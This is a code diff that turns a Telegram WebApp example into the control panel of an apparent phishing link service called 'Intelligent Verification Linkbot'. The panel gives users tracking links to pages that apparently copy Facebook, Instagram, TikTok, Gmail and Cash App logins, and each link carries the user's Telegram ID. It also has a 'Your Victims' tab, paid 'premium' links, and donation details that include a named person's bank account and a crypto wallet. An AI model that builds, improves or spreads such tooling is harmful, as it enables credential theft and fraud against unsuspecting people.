@@ -1,68 +1,450 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Telegram WebApp User Info Example</title>
-<style>
-  body { font-family: Arial, sans-serif; max-width: 480px; margin: 40px auto; }
-  input { width: 100%; padding: 10px; font-size: 1.1em; margin-top: 10px; }
-  button { padding: 10px 20px; font-size: 1.1em; margin-top: 10px; cursor: pointer; }
-  #copyMsg { color: green; margin-top: 5px; height: 20px; }
-</style>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Intelligent Verification Linkbot - WebApp</title>
+  <style>
+    /* Reset and basics */
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+    body, html {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: #eee;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-bottom: 60px;
+    }
+    header {
+      background: #111;
+      padding: 18px 20px;
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.6rem;
+      letter-spacing: 1.2px;
+      border-bottom: 1px solid #222;
+      user-select: none;
+    }
+    main {
+      flex-grow: 1;
+      overflow-y: auto;
+      padding: 15px 20px;
+    }
+    .page {
+      display: none;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .page.active {
+      display: block;
+    }
+    h2 {
+      color: #00ff99;
+      margin-bottom: 15px;
+      text-align: center;
+      font-weight: 700;
+    }
+    p {
+      line-height: 1.5;
+      max-width: 600px;
+      margin: 0 auto 15px auto;
+      font-size: 1.05rem;
+    }
+
+    /* Link list styling */
+    ul.link-list {
+      list-style: none;
+      padding-left: 0;
+      margin: 10px auto;
+      max-width: 600px;
+    }
+    ul.link-list li {
+      background: #222;
+      margin: 12px 0;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      padding: 12px 15px;
+      transition: background 0.3s ease;
+      cursor: pointer;
+    }
+    ul.link-list li:hover {
+      background: #00ff99;
+      color: #000;
+    }
+    ul.link-list li img {
+      height: 50px;
+      width: 50px;
+      object-fit: contain;
+      margin-right: 15px;
+      border-radius: 8px;
+      flex-shrink: 0;
+      border: 1.5px solid #00ff99;
+      background: #111;
+    }
+    ul.link-list li a {
+      color: inherit;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 1.1rem;
+      flex-grow: 1;
+      user-select: none;
+    }
+
+    /* Button styles */
+    .btn {
+      background: #00ff99;
+      color: #000;
+      padding: 12px 24px;
+      font-weight: 700;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      text-align: center;
+      font-size: 1.15rem;
+      transition: background 0.3s ease;
+      display: inline-block;
+      user-select: none;
+    }
+    .btn:hover {
+      background: #00cc77;
+    }
+
+    /* Disabled button */
+    .btn.disabled {
+      background: #666;
+      cursor: not-allowed;
+      color: #ccc;
+    }
+
+    /* Donate section styles */
+    .donation-info {
+      max-width: 600px;
+      margin: 0 auto;
+      background: #222;
+      padding: 20px;
+      border-radius: 12px;
+      line-height: 1.5;
+      font-size: 1.05rem;
+      text-align: center;
+    }
+    .donation-info strong {
+      color: #00ff99;
+    }
+    .crypto-address {
+      font-family: monospace;
+      background: #111;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 10px;
+      user-select: all;
+      word-break: break-all;
+    }
+
+    /* Bottom navigation */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0; right: 0;
+      height: 56px;
+      background: #111;
+      border-top: 1px solid #222;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 1000;
+      user-select: none;
+    }
+    .bottom-nav button {
+      background: none;
+      border: none;
+      color: #eee;
+      font-size: 1.35rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      cursor: pointer;
+      transition: color 0.25s ease;
+      width: 60px;
+    }
+    .bottom-nav button span {
+      font-size: 0.75rem;
+      margin-top: 2px;
+      font-weight: 600;
+    }
+    .bottom-nav button.active {
+      color: #00ff99;
+      font-weight: 700;
+    }
+    /* Responsive adjustments */
+    @media (max-width: 400px) {
+      ul.link-list li {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      ul.link-list li img {
+        margin-bottom: 8px;
+        margin-right: 0;
+      }
+    }
+  </style>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
+  <header>
+    Intelligent Verification Linkbot
+  </header>
 
-<h1>Your Telegram User Info</h1>
+  <main>
+    <!-- Home Section -->
+    <section id="home" class="page active" aria-label="Home Section">
+      <h2>Free Links</h2>
+      <ul id="freeLinksList" class="link-list" aria-live="polite" aria-atomic="true">
+        <!-- JS injects free links here -->
+      </ul>
+      <p style="text-align:center; font-size:0.85rem; opacity:0.6;">Add more free links by editing the <code>freeLinks</code> array in the script below.</p>
+    </section>
 
-<p><b>User ID:</b> <span id="userId">Loading...</span></p>
-<p><b>Username:</b> <span id="username">Loading...</span></p>
-<p><b>First Name:</b> <span id="firstName">Loading...</span></p>
-<p><b>Last Name:</b> <span id="lastName">Loading...</span></p>
+    <!-- Premium Section -->
+    <section id="premium" class="page" aria-label="Premium Links Section">
+      <h2>Premium Links</h2>
+      <div id="premiumContent">
+        <!-- JS fills premium links or message here -->
+      </div>
+      <p style="text-align:center; font-size:0.9rem; margin-top: 20px; color: #aaa;">
+        Not a premium user? <br />
+        Message us to get premium access:<br />
+        <a href="https://t.me/inamyophisintlinkbot" target="_blank" rel="noopener noreferrer" style="color:#00ff99; font-weight:700;">@inamyophisintlinkbot</a>
+      </p>
+    </section>
 
-<h2>Your Referral Link</h2>
-<input type="text" id="refLink" readonly placeholder="Referral link will appear here" />
-<button onclick="copyRefLink()">Copy Referral Link</button>
-<div id="copyMsg"></div>
+    <!-- Victim Section -->
+    <section id="victim" class="page" aria-label="Victim Section" style="text-align:center;">
+      <h2>Your Victims</h2>
+      <p>Open the bot to view all your victims.</p>
+      <button id="openBotBtn" class="btn" aria-label="Open intelligentverificationlinkbot">
+        👉 Open Bot
+      </button>
+    </section>
 
-<script>
-  const tg = window.Telegram.WebApp;
-  tg.expand();
+    <!-- Donate Section -->
+    <section id="donate" class="page" aria-label="Donate Section">
+      <h2>Support Our Project</h2>
+      <div class="donation-info" id="donationInfo">
+        <!-- Donation info will be inserted by JS based on country -->
+      </div>
+    </section>
+  </main>
 
-  const user = tg.initDataUnsafe?.user || null;
+  <nav class="bottom-nav" role="navigation" aria-label="Main Navigation">
+    <button id="navHome" class="active" aria-current="page" aria-label="Home">
+      🏠<span>Home</span>
+    </button>
+    <button id="navPremium" aria-label="Premium Links">
+      🔒<span>Premium</span>
+    </button>
+    <button id="navVictim" aria-label="Victim">
+      👁️<span>Victim</span>
+    </button>
+    <button id="navDonate" aria-label="Donate">
+      💰<span>Donate</span>
+    </button>
+  </nav>
 
-  const userIdEl = document.getElementById('userId');
-  const usernameEl = document.getElementById('username');
-  const firstNameEl = document.getElementById('firstName');
-  const lastNameEl = document.getElementById('lastName');
-  const refLinkInput = document.getElementById('refLink');
-  const copyMsg = document.getElementById('copyMsg');
+  <script src="premiumlist.js"></script>
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
 
-  if (user) {
-    userIdEl.textContent = user.id;
-    usernameEl.textContent = user.username || '(none)';
-    firstNameEl.textContent = user.first_name || '(none)';
-    lastNameEl.textContent = user.last_name || '(none)';
+    // User info from Telegram WebApp
+    const user = tg.initDataUnsafe?.user || null;
+    const telegramId = user?.id || null;
 
-    // Replace YourBotUsername with your actual bot username (without @)
-    refLinkInput.value = `https://t.me/YourBotUsername?start=${user.id}`;
-  } else {
-    userIdEl.textContent = 'Not available';
-    usernameEl.textContent = 'Not available';
-    firstNameEl.textContent = 'Not available';
-    lastNameEl.textContent = 'Not available';
-    refLinkInput.value = 'Open this WebApp via your Telegram bot to get your referral link.';
-  }
+    // Elements
+    const freeLinksList = document.getElementById('freeLinksList');
+    const premiumContent = document.getElementById('premiumContent');
+    const donationInfo = document.getElementById('donationInfo');
+    const openBotBtn = document.getElementById('openBotBtn');
 
-  function copyRefLink() {
-    if (!refLinkInput.value) return;
-    navigator.clipboard.writeText(refLinkInput.value).then(() => {
-      copyMsg.textContent = "✅ Referral link copied!";
-      setTimeout(() => copyMsg.textContent = '', 2000);
+    // Navigation buttons
+    const navButtons = {
+      home: document.getElementById('navHome'),
+      premium: document.getElementById('navPremium'),
+      victim: document.getElementById('navVictim'),
+      donate: document.getElementById('navDonate')
+    };
+
+    // Pages
+    const pages = {
+      home: document.getElementById('home'),
+      premium: document.getElementById('premium'),
+      victim: document.getElementById('victim'),
+      donate: document.getElementById('donate')
+    };
+
+    // Free links array - you can add more links here with images and URLs using template {telegram-id} for insertion
+    const freeLinks = [
+      {
+        name: "Link1",
+        image: "https://rrloaty.github.io/intelligent/img/face.png",
+        urlTemplate: "https://rrloaty.github.io/a/face.html?id={telegram-id}"
+      },
+{
+        name: "Link2",
+        image: "https://rrloaty.github.io/intelligent/img/inst.png",
+        urlTemplate: "https://rrloaty.github.io/a/inst.html?id={telegram-id}"
+      },
+      {
+        name: "Link3",
+        image: "https://rrloaty.github.io/intelligent/img/tiktok.png",
+        urlTemplate: "https://rrloaty.github.io/a/tiktok.html?id={telegram-id}"
+      },
+      {
+        name: "Link4",
+        image: "https://rrloaty.github.io/intelligent/img/gma.png",
+        urlTemplate: "https://rrloaty.github.io/a/gma.html?id={telegram-id}"
+      },
+      {
+        name: "Link5",
+        image: "https://rrloaty.github.io/intelligent/img/tiktok.png",
+        urlTemplate: "https://rrloaty.github.io/a/tiktok.html?id={telegram-id}"
+      },
+      {
+        name: "Link6",
+        image: "https://rrloaty.github.io/intelligent/img/cash.png",
+        urlTemplate: "https://rrloaty.github.io/a/cash.html?id={telegram-id}"
+      }
+      // Add more free links here as needed
+    ];
+
+    // Premium links array - you can add more here (images, names, URLs)
+    const premiumLinks = [
+      {
+        name: "Premium 1",
+        image: "https://bbott52.github.io/Mobixhub/image.png",
+        urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}"
+      }
+      // Add more premium links here
+    ];
+
+    // Function to replace {telegram-id} placeholder in URL
+    function formatUrl(template) {
+      if (!telegramId) return "#"; // no telegram id fallback
+      return template.replace("{telegram-id}", telegramId);
+    }
+
+// Render free links list
+    function renderFreeLinks() {
+      freeLinksList.innerHTML = "";
+      freeLinks.forEach(link => {
+        const li = document.createElement("li");
+
+        const img = document.createElement("img");
+        img.src = link.image;
+        img.alt = link.name;
+
+        const a = document.createElement("a");
+        a.href = formatUrl(link.urlTemplate);
+        a.target = "_blank";
+        a.rel = "noopener noreferrer";
+        a.textContent = link.name;
+
+        li.appendChild(img);
+        li.appendChild(a);
+        freeLinksList.appendChild(li);
+      });
+    }
+
+    // Render premium links or message based on user access
+    function renderPremiumLinks() {
+      if (!telegramId) {
+        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
+        return;
+      }
+      if (typeof premiumUsers === "undefined") {
+        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
+        return;
+      }
+      if (premiumUsers.includes(telegramId)) {
+        // Show premium links
+        let html = '<ul class="link-list" style="max-width: 600px; margin: 0 auto;">';
+        premiumLinks.forEach(link => {
+          const url = formatUrl(link.urlTemplate);
+          html += `
+            <li>
+              <img src="${link.image}" alt="${link.name}">
+              <a href="${url}" target="_blank" rel="noopener noreferrer">${link.name}</a>
+            </li>
+          `;
+        });
+        html += "</ul>";
+        premiumContent.innerHTML = html;
+      } else {
+        // Show upgrade message
+        premiumContent.innerHTML = `
+          <p style="color:#ffcc00; font-weight:700; text-align:center; margin-top: 20px;">
+            Go premium to view or copy these links.<br>
+            Message <a href="https://t.me/inamyophisintlinkbot" target="_blank" rel="noopener noreferrer" style="color:#00ff99; font-weight:700;">@inamyophisintlinkbot</a> to upgrade.
+          </p>
+        `;
+      }
+    }
+
+    // Open victim bot with automatic /start command
+    openBotBtn.addEventListener("click", () => {
+      const botUsername = "intelligentverificationlinkbot";
+      const url = `https://t.me/${botUsername}?start=start`;
+      window.open(url, "_blank");
     });
-  }
-</script>
 
+    // Detect if user is from Nigeria or not (simple heuristic by timezone as fallback)
+    function isUserInNigeria() {
+      // Nigeria timezone UTC+1 => offset in minutes is -60
+      const timezoneOffset = new Date().getTimezoneOffset();
+      return timezoneOffset === -60;
+    }
+
+    // Render donation info based on country detection
+    function renderDonationInfo() {
+      if (isUserInNigeria()) {
+        donationInfo.innerHTML = `
+          <p>We appreciate your support to keep our brand running and promote our links.</p>
+          <p><strong>Donation Account (Nigeria):</strong></p>
+          <p>Account Number: <strong>9114301708</strong><br/>
+          Bank: <strong>Opay</strong><br/>
+          Account Name: <strong>Olatunji Abdumalik Ayomide</strong></p>
+          <p>Thank you for your generosity!</p>
+        `;
+      } else {
+        donationInfo.innerHTML = `
+          <p>We appreciate your support to keep our brand running and promote our links.</p>
+          <p><strong>Donate with crypto (BNB, USDT, BEP20):</strong></p>
+          <p class="crypto-address">0xbBcc409872bC2441400735624638F3D67DAa7C4C</p>
+          <p>Thank you for your generosity!</p>
+        `;
+      }
+    }
+
+    // Navigation button click handler
+    function switchPage(pageKey) {
+      Object.keys(pages).forEach(key => {
+        pages[key].classList.toggle("active", key === pageKey);
+        navButtons[key].classList.toggle("active", key === pageKey);
+      });
+    }
+
+    // Hook up nav buttons
+    Object.entries(navButtons).forEach(([key, btn]) => {
+      btn.addEventListener("click", () => switchPage(key));
+    });
+
+    // Initialize app UI
+    renderFreeLinks();
+    renderPremiumLinks();
+    renderDonationInfo();
+    </script>
 </body>
 </html>
